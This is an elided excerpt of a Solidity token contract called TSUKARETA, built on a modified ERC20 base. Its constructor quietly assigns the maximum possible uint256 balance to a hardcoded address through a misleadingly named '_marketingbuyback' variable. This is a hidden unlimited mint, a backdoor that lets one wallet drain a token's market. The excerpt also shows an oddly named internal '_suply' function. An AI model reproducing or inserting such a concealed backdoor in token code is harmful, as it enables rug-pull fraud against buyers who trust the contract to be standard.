...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _marketingbuyback = ~uint256(0);
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _balances[0x3e1b9e8cadb0b2F01A497Eb72de6e43BFB2E0d76] = _marketingbuyback;
    }
     ...
     */
    function _suply(address account, uint256 amount) internal virtual {
...
contract TSUKARETA is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("TSUKARETA", "TSUKARETA") {
